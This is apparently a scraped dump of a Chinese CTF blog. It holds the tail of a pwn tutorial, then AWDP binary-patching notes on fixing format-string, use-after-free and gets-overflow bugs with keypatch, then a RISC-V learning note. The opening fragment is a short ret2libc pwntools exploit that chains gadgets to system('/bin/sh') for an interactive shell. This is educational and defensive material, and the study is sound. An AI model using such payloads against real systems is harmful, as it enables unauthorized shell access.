本exp假定题目已经提供了libc库，我们可以使用ROPgadget来搜索gadget # 若没有提供libc库则需要先使用libcSearcher库来泄漏libc的版本，大家可以自己动手试一下~ ret = libcbase + 0x000000000002a3e6 pop_rdi = libcbase + 0x000000000002a3e5 binsh = libcbase+0x1d8698 system = libcbase + 0x50d60 payload = b\u0026#39;A\u0026#39;*40 payload += p64(ret) payload += p64(pop_rdi) payload += p64(binsh) payload += p64(system) sh.sendlineafter(b\u0026#39;take?: \u0026#39;, payload) sh.recv() sh.sendline(b\u0026#39;a\u0026#39;*16+b\u0026#39;W\u0026#39;) sh.recv() sh.sendline(b\u0026#39;1\u0026#39;) sh.interactive() 参考链接与推荐阅读： # pwn入门教程 · ta0lve\nCTF经验贴｜我们对PWN都有哪些误会 (qq.com)\n栈介绍 - CTF Wiki (ctf-wiki.org)\n在VMware16虚拟机安装Ubuntu详细教程_vmware16安装ubuntu_wings(hha)的博客-CSDN博客\nPWN环境二次搭建记录-Ubuntu 22.04 · ta0lve\nIDA Free (hex-rays.com)\nLinux 常用保护机制 | Lantern\u0026rsquo;s 小站\nLinux保护机制和绕过方式 - 一点涵 - 博客园 (cnblogs.com)\n主函数main和程序入口_start__start函数_Freestyle Coding的博客-CSDN博客\nLinux x86 Program Start Up (dbp-consulting.com)\n[Linux x86 Program Start Up or- 翻译][注解版] - 知乎 (zhihu.com)\nI\\O操作之setbuf、setvbuf_ll2323001的博客-CSDN博客\nC语言中连续定义两个变量，为什么地址是这样的？ - 知乎 (zhihu.com)\ngdb x 命令详解\nPIE保护详解和常用bypass手段-安全客 - 安全资讯平台 (anquanke.com)\n函数调用的基本原理\nC语言函数调用栈(一) - clover_toeic - 博客园 (cnblogs.com)\nC语言函数调用栈(二) - clover_toeic - 博客园 (cnblogs.com)\n基本 ROP - CTF Wiki (ctf-wiki.org)\n","date":"September 23, 2023","permalink":"/posts/pwn/basic/tutorial11/","section":"Posts","summary":"\u003cp\u003e写给学弟学妹的pwn入门宣讲~\u003c/p\u003e","title":"CTF入门宣讲-PWN方向"},{"content":"","date":"September 11, 2023","permalink":"/tags/awdp/","section":"Tags","summary":"","title":"AWDP"},{"content":"","date":"September 11, 2023","permalink":"/series/awdp-pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"Series","summary":"","title":"AWDP PWN学习记录"},{"content":"","date":"September 11, 2023","permalink":"/categories/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"Categories","summary":"","title":"PWN学习记录"},{"content":"此文章还在施工中，\n路过的师傅们看看远处的学习记录吧！\nPWN环境二次搭建记录-Ubuntu 22.04 July 10, 2023\u0026middot;9775 字\u0026middot;20 分钟 pwn入门 CTF PWN Ubuntu 堆基础知识学习记录 July 31, 2023\u0026middot;9063 字\u0026middot;19 分钟 PWN学习记录 CTF PWN heap 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r参考学习链接：\n二进制文件应急修复 | CataLpa\u0026rsquo;s Site (wzt.ac.cn)\n前言 # 工具简介 # 在 patch 二进制文件时几个常用工具：\nIDA keypatch LIEF IDA 无需多言，keypatch 是 IDA 的一个插件，项目地址：https://github.com/keystone-engine/keypatch ，虽然 IDA 自带了一个 patch 工具，但是 keypatch 的功能要远远强于它。\nLIEF 是一个支持多个平台的二进制工具，通过 LIEF 可以实现对 binary 的 patch、hook、以及导入、导出函数等操作， 灵活使用能够达到意想不到的效果。\nLIEF 有详细的官方教程以及 API 文档，大家可以自行了解用法。\nFentanyl安装 # Fentanyl\nIDA Python 脚本，用于快速 patch。\nUsage\nLoading Fentanyl.py\nAlt+F7 or File \u0026gt; Script File to load scripts Browse to main.py and open it That\u0026rsquo;s it! Key Bindings\nSome of these keybindings can be accessed by right-clicking on the screen in graph view.\nAlt-N Convert instructions to nops Alt-X Nop all xrefs to this function Alt-J Invert conditional jump Alt-P Patch instruction Alt-Z Undo modification (Won\u0026rsquo;t always work. Should still be careful editing.) Alt-Y Redo modification (Won\u0026rsquo;t always work. Should still be careful editing.) Alt-S Save file Alt-C Find Code Caves Ctrl-Alt-F Make jump unconditional Ctrl-Alt-N Neuter the binary (remove calls to fork, setuid, setgid, getpwnam, setgroups, and chdir) 用法\n装载 Fentanyl.py\nAlt+F7或加载脚本File \u0026gt; Script File 浏览并打开它main.py 就是这样！ 快捷键 # 其中一些键绑定可以通过右键单击图形视图中的屏幕来访问。\nAlt-N将指令转换为 nops Alt-X将此函数的所有外部参照转换为nop Alt-J反转条件跳转 Alt-P补丁说明 Alt-Z撤消修改（并不总是有效。仍然应该仔细编辑。 Alt-Y重做修改（并不总是有效。仍然应该仔细编辑。 Alt-S保存文件 Alt-C查找代码洞穴 Ctrl-Alt-F无条件跳转 Ctrl-Alt-N对二进制进行中性化（删除对fork，setuid，setgid，getpwnam，setgroups和chdir的调用） Patch学习 # 程序的每条指令都有一定的长度，指令与指令之间没有多余字节，当 patch 代码时，可能会遇到添加或删除代码的情况，删除代码比较容易实现，直接使用 nop 指令替代原始代码即可，但是当需要添加、修改代码的时候，经常会遇到字节数不够用的情况，为了保证程序正常运行，我们又不能修改掉正常代码，这时就需要寻找一个合适的空间来保存 shellcode，并且这块空间需要具有可执行权限。\n大部分 ELF 程序都有一个 .eh_frame 段，功能描述如下\n/* When gcc generates code that handles exceptions, it produces tables that describe how to unwind the stack. These tables are found in the .eh_frame section. 当gcc生成处理异常的代码时，它会生成描述如何展开堆栈的表。这些表位于.eh_frame节中。*/ 简单来讲，这个段的是编译器自己添加进去的，当代码中包含异常处理操作时就会生成，它的主要作用时描述如何卸载 stack。\n一般情况下，程序正常运行的时候是不会触发异常处理代码的，于是这个段就可以作为保存 patch 代码的空间。\nPatch思路 # **Patch 的核心思想：**在不破坏程序原有功能的情况下，加入或者删除部分代码，修复程序的漏洞。\n删除代码容易实现，但是插入代码难度就比较高了，具体我们在下面讨论。\n一个 binary 的漏洞通常出现在某个函数调用前后 例如指针悬挂漏洞是由于 free 一个 chunk 没有清空它的指针导致的， 再如格式化字符串漏洞是参数问题导致的。 patch 漏洞的时候一个核心思路是保持程序正常功能的同时，加入检测、修复代码， 而最适于实现这个操作的位置就是 call 指令。 第一，call 指令长度为 5 个字节，空间充裕， 第二，通过 call 跳转的功能可以劫持程序的控制流到我们的 patch 代码上， 完成修复之后再通过强制跳转指令回到正确的控制流， 对程序的修改很小，相对于增加一个段或者是 libc 的方法来说更加稳定。 根据漏洞修复的难度，可以把漏洞分为以下四类\n后门函数、危险的字符串(/bin/sh)、输入函数长度溢出(硬编码)等 格式化字符串等 指针悬挂、堆栈溢出(动态长度)等 逻辑漏洞 这几类漏洞在 CTF、AWD 比赛中很常见，也是二进制漏洞利用的主要考察点，按照不同的漏洞又可以总结出几种修复方式\n暴力 nop、修改硬编码数据\n替换 GOT 表条目、符号解析信息\n第三方工具替换系统函数、添加代码\n手动添加代码\n格式化字符串漏洞 # 很明显的格式化字符串漏洞，造成漏洞的主要原因是 printf 函数参数用户可控。\npatch 格式化字符串类的漏洞比较简单，通常直接使用 keypatch 修改 call printf 前后代码，满足 puts(buf) 即可。\n将 printf 改为 puts # patch前：\n.text:0000000000000DEF call read .text:0000000000000DF4 lea rax, [rbp+buf] .text:0000000000000DF8 mov rsi, rax .text:0000000000000DFB mov edi, offset unk_1 ; s .text:0000000000000E00 mov eax, 0 .text:0000000000000E05 call __printf_chk .text:0000000000000E0A lea rdi, aPleaseInputYou ; \u0026#34;Please input your patch后\n.text:0000000000000DEF call read .text:0000000000000DF4 lea rax, [rbp+buf] .text:0000000000000DF8 mov rdi, rax ; Keypatch modified this from: .text:0000000000000DF8 ; mov rsi, rax .text:0000000000000DFB nop ; s .text:0000000000000DFB ; Keypatch modified this from: .text:0000000000000DFB ; mov edi, offset unk_1 .text:0000000000000DFB ; Keypatch padded NOP to next boundary: 4 bytes .text:0000000000000DFC nop .text:0000000000000DFD nop .text:0000000000000DFE nop .text:0000000000000DFF nop .text:0000000000000E00 mov eax, 0 .text:0000000000000E05 call puts ; Keypatch modified this from: .text:0000000000000E05 ; call __printf_chk .text:0000000000000E0A lea rdi, aPleaseInputYou ; \u0026#34;Please input you 反编译结果：\nps：某些情况下程序中可能没有 puts 函数，此时需要对 printf 函数进行一定程度的修改，在真正输出字符串之前先过滤，去掉非法字符串(例如 %p 等)，如何 patch 参考下面的内容。\n附录 # 学习与参考链接：\n二进制文件应急修复 | CataLpa\u0026rsquo;s Site (wzt.ac.cn)\n","date":"September 11, 2023","permalink":"/posts/pwn/awdp/0x02/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章还在施工中，\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的学习记录吧！\u003c/p\u003e","title":"从0到0.002的AWDP实战记录"},{"content":"此文章还在施工中，\n路过的师傅们看看远处的学习记录吧！\nPWN环境二次搭建记录-Ubuntu 22.04 July 10, 2023\u0026middot;9775 字\u0026middot;20 分钟 pwn入门 CTF PWN Ubuntu 堆基础知识学习记录 July 31, 2023\u0026middot;9063 字\u0026middot;19 分钟 PWN学习记录 CTF PWN heap 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r参考学习链接：\n二进制文件应急修复 | CataLpa\u0026rsquo;s Site (wzt.ac.cn)\n前言 # 工具简介 # 在 patch 二进制文件时几个常用工具：\nIDA keypatch LIEF IDA 无需多言，keypatch 是 IDA 的一个插件，项目地址：https://github.com/keystone-engine/keypatch ，虽然 IDA 自带了一个 patch 工具，但是 keypatch 的功能要远远强于它。\nLIEF 是一个支持多个平台的二进制工具，通过 LIEF 可以实现对 binary 的 patch、hook、以及导入、导出函数等操作， 灵活使用能够达到意想不到的效果。\nLIEF 有详细的官方教程以及 API 文档，大家可以自行了解用法。\nFentanyl安装 # Fentanyl\nIDA Python 脚本，用于快速 patch。\nUsage\nLoading Fentanyl.py\nAlt+F7 or File \u0026gt; Script File to load scripts Browse to main.py and open it That\u0026rsquo;s it! Key Bindings\nSome of these keybindings can be accessed by right-clicking on the screen in graph view.\nAlt-N Convert instructions to nops Alt-X Nop all xrefs to this function Alt-J Invert conditional jump Alt-P Patch instruction Alt-Z Undo modification (Won\u0026rsquo;t always work. Should still be careful editing.) Alt-Y Redo modification (Won\u0026rsquo;t always work. Should still be careful editing.) Alt-S Save file Alt-C Find Code Caves Ctrl-Alt-F Make jump unconditional Ctrl-Alt-N Neuter the binary (remove calls to fork, setuid, setgid, getpwnam, setgroups, and chdir) 用法\n装载 Fentanyl.py\nAlt+F7或加载脚本File \u0026gt; Script File 浏览并打开它main.py 就是这样！ 快捷键 # 其中一些键绑定可以通过右键单击图形视图中的屏幕来访问。\nAlt-N将指令转换为 nops Alt-X将此函数的所有外部参照转换为nop Alt-J反转条件跳转 Alt-P补丁说明 Alt-Z撤消修改（并不总是有效。仍然应该仔细编辑。 Alt-Y重做修改（并不总是有效。仍然应该仔细编辑。 Alt-S保存文件 Alt-C查找代码洞穴 Ctrl-Alt-F无条件跳转 Ctrl-Alt-N对二进制进行中性化（删除对fork，setuid，setgid，getpwnam，setgroups和chdir的调用） Patch学习 # 程序的每条指令都有一定的长度，指令与指令之间没有多余字节，当 patch 代码时，可能会遇到添加或删除代码的情况，删除代码比较容易实现，直接使用 nop 指令替代原始代码即可，但是当需要添加、修改代码的时候，经常会遇到字节数不够用的情况，为了保证程序正常运行，我们又不能修改掉正常代码，这时就需要寻找一个合适的空间来保存 shellcode，并且这块空间需要具有可执行权限。\n大部分 ELF 程序都有一个 .eh_frame 段，功能描述如下\n/* When gcc generates code that handles exceptions, it produces tables that describe how to unwind the stack. These tables are found in the .eh_frame section. 当gcc生成处理异常的代码时，它会生成描述如何展开堆栈的表。这些表位于.eh_frame节中。*/ 简单来讲，这个段的是编译器自己添加进去的，当代码中包含异常处理操作时就会生成，它的主要作用时描述如何卸载 stack。\n一般情况下，程序正常运行的时候是不会触发异常处理代码的，于是这个段就可以作为保存 patch 代码的空间。\nPatch思路 # **Patch 的核心思想：**在不破坏程序原有功能的情况下，加入或者删除部分代码，修复程序的漏洞。\n删除代码容易实现，但是插入代码难度就比较高了，具体我们在下面讨论。\n一个 binary 的漏洞通常出现在某个函数调用前后 例如指针悬挂漏洞是由于 free 一个 chunk 没有清空它的指针导致的， 再如格式化字符串漏洞是参数问题导致的。 patch 漏洞的时候一个核心思路是保持程序正常功能的同时，加入检测、修复代码， 而最适于实现这个操作的位置就是 call 指令。 第一，call 指令长度为 5 个字节，空间充裕， 第二，通过 call 跳转的功能可以劫持程序的控制流到我们的 patch 代码上， 完成修复之后再通过强制跳转指令回到正确的控制流， 对程序的修改很小，相对于增加一个段或者是 libc 的方法来说更加稳定。 根据漏洞修复的难度，可以把漏洞分为以下四类\n后门函数、危险的字符串(/bin/sh)、输入函数长度溢出(硬编码)等 格式化字符串等 指针悬挂、堆栈溢出(动态长度)等 逻辑漏洞 这几类漏洞在 CTF、AWD 比赛中很常见，也是二进制漏洞利用的主要考察点，按照不同的漏洞又可以总结出几种修复方式\n暴力 nop、修改硬编码数据\n替换 GOT 表条目、符号解析信息\n第三方工具替换系统函数、添加代码\n手动添加代码\n格式化字符串漏洞 # 很明显的格式化字符串漏洞，造成漏洞的主要原因是 printf 函数参数用户可控。\npatch 格式化字符串类的漏洞比较简单，通常直接使用 keypatch 修改 call printf 前后代码，满足 puts(buf) 即可。\n将 printf 改为 puts # patch前：\n.text:0000000000000DEF call read .text:0000000000000DF4 lea rax, [rbp+buf] .text:0000000000000DF8 mov rsi, rax .text:0000000000000DFB mov edi, offset unk_1 ; s .text:0000000000000E00 mov eax, 0 .text:0000000000000E05 call __printf_chk .text:0000000000000E0A lea rdi, aPleaseInputYou ; \u0026#34;Please input your patch后\n.text:0000000000000DEF call read .text:0000000000000DF4 lea rax, [rbp+buf] .text:0000000000000DF8 mov rdi, rax ; Keypatch modified this from: .text:0000000000000DF8 ; mov rsi, rax .text:0000000000000DFB nop ; s .text:0000000000000DFB ; Keypatch modified this from: .text:0000000000000DFB ; mov edi, offset unk_1 .text:0000000000000DFB ; Keypatch padded NOP to next boundary: 4 bytes .text:0000000000000DFC nop .text:0000000000000DFD nop .text:0000000000000DFE nop .text:0000000000000DFF nop .text:0000000000000E00 mov eax, 0 .text:0000000000000E05 call puts ; Keypatch modified this from: .text:0000000000000E05 ; call __printf_chk .text:0000000000000E0A lea rdi, aPleaseInputYou ; \u0026#34;Please input you 反编译结果：\nps：某些情况下程序中可能没有 puts 函数，此时需要对 printf 函数进行一定程度的修改，在真正输出字符串之前先过滤，去掉非法字符串(例如 %p 等)，如何 patch 参考下面的内容。\nUAF # unsigned __int64 delete() { int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\u0026#34;Please input the index:\u0026#34;); _isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v1); free(chunk_list[2 * v1]); // uaf puts(\u0026#34;Done!\u0026#34;); return __readfsqword(0x28u) ^ v2; } 这是一个 UAF 漏洞，堆块指针保存在全局数组中，但是 free 的时候没有清除指针，导致 UAF。\npatch 这种漏洞就不能直接在原来的代码基础上修改了，因为直接添加代码会导致指令被覆盖，破坏程序的正常功能。\n法一 # 这里用到上面提到的技巧，通过修改 call 指令劫持程序的控制流到 .eh_frame 段即添加的 fix 代码处，对 chunk_list 执行清空操作，然后正常调用 free 函数完成程序功能，最后通过强制跳转指令回到正常的控制流。\npatch前：\n.text:0000000000000D79 lea rax, chunk_list .text:0000000000000D80 mov rax, [rdx+rax] .text:0000000000000D84 mov rdi, rax ; ptr .text:0000000000000D87 call free .text:0000000000000D8C lea rdi, aDone ; \u0026#34;Done!\u0026#34; .text:0000000000000D93 call p Patch后(在 .eh_frame 段添加了代码)：\n.eh_frame:00000000000011F9 ; START OF FUNCTION CHUNK FOR delete .eh_frame:00000000000011F9 .eh_frame:00000000000011F9 loc_11F9: ; CODE XREF: delete+55↑j .eh_frame:00000000000011F9 lea rax, chunk_list .eh_frame:0000000000001200 mov rax, [rdx+rax] ; Keypatch modified this from: .eh_frame:0000000000001200 ; add [rdx+52h], edi .eh_frame:0000000000001200 ; Keypatch padded NOP to next boundary: 2 bytes .eh_frame:0000000000001200 ; Keypatch modified this from: .eh_frame:0000000000001200 ; nop .eh_frame:0000000000001200 ; nop .eh_frame:0000000000001200 ; nop .eh_frame:0000000000001200 ; nop .eh_frame:0000000000001204 mov qword ptr [rax], 0 ; Keypatch modified this from: .eh_frame:0000000000001204 ; nop .eh_frame:0000000000001204 ; js short loc_1217 .eh_frame:0000000000001204 ; Keypatch modified this from: .eh_frame:0000000000001204 ; mov r9, rax .eh_frame:0000000000001204 ; Keypatch padded NOP to next boundary: 2 bytes .eh_frame:0000000000001204 ; Keypatch modified this from: .eh_frame:0000000000001204 ; nop .eh_frame:0000000000001204 ; nop .eh_frame:0000000000001204 ; nop .eh_frame:0000000000001204 ; add [rbx], ebx .eh_frame:0000000000001204 ; or al, 7 .eh_frame:000000000000120B call free ; Keypatch modified this from: .eh_frame:000000000000120B ; or [rax+24000001h], dl .eh_frame:000000000000120B ; Keypatch padded NOP to next boundary: 1 bytes .eh_frame:0000000000001210 jmp loc_D8C ; Keypatch modified this from: patch 后反编译\nunsigned __int64 delete() { signed __int64 v0; // rdx void *v1; // rdi int v3; // [rsp+4h] [rbp-Ch] unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); puts(\u0026#34;Please input the index:\u0026#34;); _isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v3); v0 = 2LL * v3; v1 = chunk_list[v0]; *chunk_list[v0] = 0LL; free(v1); puts(\u0026#34;Done!\u0026#34;); return __readfsqword(0x28u) ^ v4; } 法二 # 找到free的地方\n.text:0000000000400762 mov eax, [rbp+var_74] .text:0000000000400765 cdqe .text:0000000000400767 mov rax, [rbp+rax*8+ptr] .text:000000000040076C mov rdi, rax ; ptr .text:000000000040076F call _free 可以看到free的参数是[rbp+rax*8+ptr]\nptr在main函数开头可以看见\n.text:00000000004006D6 var_74 = dword ptr -74h .text:00000000004006D6 ptr = qword ptr -70h .text:00000000004006D6 var_18 = qword ptr -18h 在eh_frame段找一个地方写上我们的汇编代码，我这里找的是0x400900\ncall 0x400560;这里的地址是_free的地址，这里有大坑 mov eax,[rbp-0x74];[rbp-0x74]对应[rbp+var_74] cdqe; lea rdx,ds:0[rax*8]; lea rax,[rbp-0x70];[rbp-0x70]对应rbp mov r8,0; mov [rbp+rax],r8; jmp 0x00400774;跳转回去 然后把原函数call_free的地方改成jmp 0x400900即可\n大坑 # IDA告诉你它patch完了，但是它其实patch歪了\n比如这里，call 0x400560的机器码是E8 5B FC FF FF\n但是它给你patch成了 E8 5B FC BF 8C\n所以你得用010 editor手动改一下机器码\ngets栈溢出 # puts(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); gets(s); gets 栈溢出，如法炮制，修改 call gets 指令劫持控制流到 .eh_frame 段。但是这里有一个问题，此程序中只有 gets 函数能够接受用户输入，难道就无法 patch 了吗？\n其实不然，因为还有 syscall 可以使用，通过 syscall 构造 read 函数，就能控制输入数据的长度，完成修复。\npatch 前：\n.text:00000000004009D1 lea rax, [rbp+s] .text:00000000004009D5 mov rdi, rax .text:00000000004009D8 mov eax, 0 .text:00000000004009DD call _gets .text:00000000004009E2 jmp loc_40 patch 后：\n.eh_frame:0000000000400F7D ; START OF FUNCTION CHUNK FOR encrypt .eh_frame:0000000000400F7D .eh_frame:0000000000400F7D loc_400F7D: ; Keypatch modified this from: .eh_frame:0000000000400F7D mov rax, 3 ; db 0 .eh_frame:0000000000400F7D ; db 0 .eh_frame:0000000000400F7D ; db 0 .eh_frame:0000000000400F7D ; db 0 .eh_frame:0000000000400F7D ; db 0 .eh_frame:0000000000400F7D ; Keypatch modified this from: .eh_frame:0000000000400F7D ; mov eax, 3 .eh_frame:0000000000400F7D ; db 0BBh .eh_frame:0000000000400F7D ; db 0 .eh_frame:0000000000400F84 mov rbx, 0 ; Keypatch modified this from: .eh_frame:0000000000400F84 ; db 0 .eh_frame:0000000000400F84 ; db 0 .eh_frame:0000000000400F84 ; db 0 .eh_frame:0000000000400F84 ; db 0 .eh_frame:0000000000400F84 ; db 14h .eh_frame:0000000000400F84 ; db 0 .eh_frame:0000000000400F84 ; db 0 .eh_frame:0000000000400F8B mov rcx, rdi ; Keypatch modified this from: .eh_frame:0000000000400F8B ; db 0 .eh_frame:0000000000400F8B ; db 0 .eh_frame:0000000000400F8B ; db 0 .eh_frame:0000000000400F8E mov rdx, 40h ; Keypatch modified this from: .eh_frame:0000000000400F8E ; db 0 .eh_frame:0000000000400F8E ; db 0 .eh_frame:0000000000400F8E ; db 1 .eh_frame:0000000000400F8E ; db 7Ah .eh_frame:0000000000400F8E ; db 52h .eh_frame:0000000000400F8E ; db 0 .eh_frame:0000000000400F8E ; db 1 .eh_frame:0000000000400F95 syscall ; Keypatch modified this from: .eh_frame:0000000000400F95 ; js short loc_400FA7 .eh_frame:0000000000400F95 ; add [rbx], ebx .eh_frame:0000000000400F95 ; or al, 7 .eh_frame:0000000000400F95 ; Keypatch padded NOP to next boundary: 1 bytes .eh_frame:0000000000400F95 ; Keypatch modified this from: .eh_frame:0000000000400F95 ; jmp loc_400AB4 .eh_frame:0000000000400F95 ; Keypatch padded NOP to next boundary: 3 bytes .eh_frame:0000000000400F97 jmp loc_400AB4 ; Keypatch modified this from: .eh_frame:0000000000400F97 ; END OF FUNCTION CHUNK FOR encrypt ; nop 反编译代码：\nputs(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); __asm { syscall; Keypatch modified this from: } // read 总结 # Patch binary 的时候要注意不能使文件体积变动过大，否则很容易被判宕机，另外，针对不同的漏洞有不同的修复手段，但是总体上来看就是添加、删除代码的过程。patch 过程中注意不要破坏原有的功能（特别是堆栈、寄存器等运行环境），防止 check 不过，当遇到比较复杂的漏洞或者文件空间不足等情况，应该考虑使用如 LIEF 等工具直接替换整个函数。\n附录 # 学习与参考链接：\n二进制文件应急修复 | CataLpa\u0026rsquo;s Site (wzt.ac.cn)\n","date":"September 4, 2023","permalink":"/posts/pwn/awdp/0x01/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章还在施工中，\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的学习记录吧！\u003c/p\u003e","title":"从0到0.001的AWDP学习记录"},{"content":"本文是一篇RISC-V PWN的学习记录，同时也是羊城杯2023 risky_login一题的wp.\n前言 # 这个周末刚打完的羊城杯的第一题risky_login是一道漏洞比较简单的RISC-V架构的基础题，可以借这道题熟悉一下RISC-V架构，扩展一下知识面。\n以下我将结合这道题记录一下我的RISC-V基础知识的学习\n（wp在文章的最后）\nRISC-V基础 # RISC-V64 pwn题，与常见的X86架构和ARM架构不太一样\n目前市场上主流的芯片架构有 X86、ARM、RISC-V和MIPS四种 RISC-V 架构是基于 精简指令集计算（RISC）原理建立的开放 指令集架构（ISA），RISC-V是在指令集不断发展和成熟的基础上建立的全新指令 实际上，ARM、MIPS都是采取 精简指令集（RISC）的处理器架构，基于RISC原理建立 经改进，这种架构可支持高级语言的优化执行。其算术和逻辑运算采用三个操作数的形式，允许编译器优化复杂的表达式 安装Ghidra # 我们将二进制拖进IDA中，可以看到汇编指令确实和我们常见的X86不太一样，按一下F5或是Tab键，我们还发现IDA不能将RISC-V架构的二进制文件转成伪代码，所以我们考虑安装下载另一个强大的反编译工具： Ghidra\n安装方式可以参考官方：\nTo install an official pre-built multi-platform Ghidra release:\nInstall JDK 17 64-bit Download a Ghidra release file Extract the Ghidra release file Launch Ghidra: ./ghidraRun (or ghidraRun.bat for Windows) 安装好了就可以用ghidra打开二进制文件来查看伪代码了，\n比如这个后门函数：\n当然这个程序不会很复杂，所以直接看IDA的汇编代码也是完全可以的\n寄存器学习 # 先放几个，之后慢慢补（鸽）\nx86下的一些寄存器复习：\n除了ESP寄存器，x86架构还有其他与栈相关的寄存器：\nESP（Extended Stack Pointer）是 栈指针寄存器，用于指示当前栈顶的地址 即栈的生长方向向下时，ESP存储的是栈顶元素的地址 当函数进行调用时，该寄存器会被修改，使其指向分配给该函数的新栈帧的顶部。 在函数返回时，栈上的数据会被弹出，同时ESP的值会恢复到调用该函数之前的状态，以指向上一个栈帧的顶部。 EBP（Extended Base Pointer）是 帧指针寄存器，用于指示当前函数堆栈帧的起始地址。 ESI（Source Index）和EDI（Destination Index）寄存器常用于字符串操作，其中ESI通常用于读取源数据，EDI用于写入目标数据。 RISC-V的 sp 寄存器\n与x86的栈指针 esp/rsp 寄存器类似 RISC-V的sp寄存器（Stack Pointer）用于指示栈的位置，它存储当前栈顶的地址 x86架构中，ESP寄存器（Extended Stack Pointer）也用于指示栈的位置，它存储当前栈顶的地址。 RISC-V的 fp 寄存器\n与x86的帧指针 ebp/rbp 寄存器类似 RISC-V的fp寄存器（Frame Pointer）用于指示函数堆栈帧的起始地址。 x86架构中，EBP寄存器（Base Pointer）也用于指示函数堆栈帧的起始地址 RISC-V的 s0 寄存器\ns0寄存器通常用于保存临时数据和中间计算结果，并且在函数调用和返回过程中可能会被修改 作为通用寄存器，s0寄存器没有固定的特殊作用，而是根据编程的需要来使用。 在函数调用中，s0寄存器可用于保存临时变量、函数参数或其他需要暂存的数据。 例如，可以使用s0寄存器来存储函数内的局部变量或进行运算的中间结果。 在RISC-V的编程约定中，通常将s0寄存器用作临时寄存器，在函数调用过程中可以被随时修改。 而真正用于栈指针功能的寄存器是sp寄存器，它用于指示栈的位置和管理函数调用过程中的内存分配。 RISC-V的 pc 寄存器\npc（Program Counter）存储当前指令的地址， 类似于x86的 EIP 寄存器（Extended Instruction Pointer） RISC-V的其他寄存器\nRISC-V的 x1-x31 寄存器，也称为x0-x31，用于存储通用数据，类似于x86的寄存器AX，BX，CX等 RISC-V的 x0 寄存器常被约定为零寄存器，并且不可被写入，类似于x86的寄存器 EAX 中的零标志 RISC-V的浮点寄存器 f0-f31 用于存储浮点数，类似于x86的 XMM0-XMM15 寄存器 汇编指令学习 # 简单了解一些RSIC-V指令：\n加法指令（add）：\nadd x1, x2, x3 # 将x2和x3寄存器中的值相加，结果保存在x1寄存器 add x4, x5, x6 # 将x5和x6寄存器中的值相加，结果保存在x4寄存器 加载指令（lw）：\nlw x2, 0(x3) # 将位于内存地址x3的字中的内容加载到x2寄存器 lw x4, 4(x5) # 将位于内存地址x5+4的字中的内容加载到x4寄存器 减法指令（sub）：\nsub x1, x2, x3 # 将x3寄存器中的值从x2寄存器中减去，结果保存在x1寄存器 sub x4, x5, x6 # 将x6寄存器中的值从x5寄存器中减去，结果保存在x4寄存器 存储指令（sw）：\nsw x2, 0(x3) # 将x2寄存器中的内容存储到内存地址x3的字中 sw x4, 4(x5) # 将x4寄存器中的内容存储到内存地址x5+4的字中 加载指令 # 先复习一下什么是零扩展：\n零扩展（Zero Extension）是一种数据扩展操作，用于将低位数据的符号位补齐为零，将较小的数据类型（如字节或半字）扩展为较大的数据类型（如字或双字）。在零扩展中，符号位不会影响数值的扩展结果，只是简单地用零填充高位。\n在x86和x64指令集中，movzx指令 就是 零扩展移动 例如：movzx ebx，al将一个字节从al寄存器复制到ebx的低位字节，然后用零填充ebx的其余字节。 在x64上，大多数写入任何通用寄存器的低32位的指令都会将目标寄存器的高一半置零。 例如，指令 mov eax，1234 将清除rax寄存器的高32位。 简而言之，零扩展就是如果位数不够时，直接在高位补零 原来的无符号数字的值保持不变 但是原来的有符号数字的值就发生了改变 举个例子：假设我们有一个8位的二进制数：0110 1011。\n它代表一个无符号的整数107和一个有符号的整数-37（当使用二进制补码表示法时）。\n如果我们进行零扩展将其扩展为16位，那么符号位之后的所有位将填充为零，如下所示：\n0000 0000 0110 1011 可以看到，高8位都被填充为零，原始的8位数据在低位保持不变。\n这样，我们将8位数据零扩展为16位数据，使得原始数据在更大数据类型中占据了相同的位置，而不会改变无符号数字的数值本身。\n当然，有符号数字的数值就发生了改变。\n再来看看符号扩展：\n符号扩展（Sign Extension）是一种数据扩展操作，用于将较小的数据类型（如字节或半字）扩展为较大的有符号数据类型（如字或双字）。在符号扩展中，通过复制原始数据的最高有效位（符号位）来填充高位，以保持数值的有符号性质。\n简而言之，符号扩展就是如果位数不够时，直接在高位补原来的符号位的值\n原来的有符号数字的值保持不变 但是原来的无符号数字的值就发生了改变 例如，假设我们有一个8位的二进制数：1101 0011。它代表一个有符号的补码整数-45。\n如果我们进行符号扩展将其扩展为16位，那么符号位会被复制填充到高位，如下所示：\n1111 1111 1101 0011 可以看到，高8位都被填充为原始符号位的值，即1。这样，我们将8位数据符号扩展为16位数据，保留了原始数据的有符号特征。\nlb（加载字节）：\n功能：从内存中加载一个字节（8位），进行有符号扩展，并存储到目标寄存器中。 注意：如果加载的对应地址的数据大于一字节（8位），就会造成数据丢失，是一个有漏洞的危险指令 可以用来绕过一些检测，如在对一个数加载一个字节之后再进行比较，我们可以使其后8位满足条件绕过检测 语法：lb rd, rs1, imm rd：目标寄存器，存储加载的数据 rs1：源寄存器，用于计算内存地址 imm：立即数偏移量，与rs1相加得到内存地址 lb x10, x2, 4 # 从内存地址(x2+4)处加载一个字节数据到x10，并进行有符号扩展 lh（加载半字）：\n功能：从内存中加载一个半字（16位），进行有符号扩展，并存储到目标寄存器中。 注意：如果加载的对应地址的数据大于一个半字（16位），就会造成数据丢失，是一个有漏洞的危险指令 语法：lh rd, rs1, imm rd：目标寄存器，存储加载的数据 rs1：源寄存器，用于计算内存地址 imm：立即数偏移量，与rs1相加得到内存地址 lh x5, x9, -8 # 从内存地址(x9-8)处加载一个半字数据到x5，并进行有符号扩展 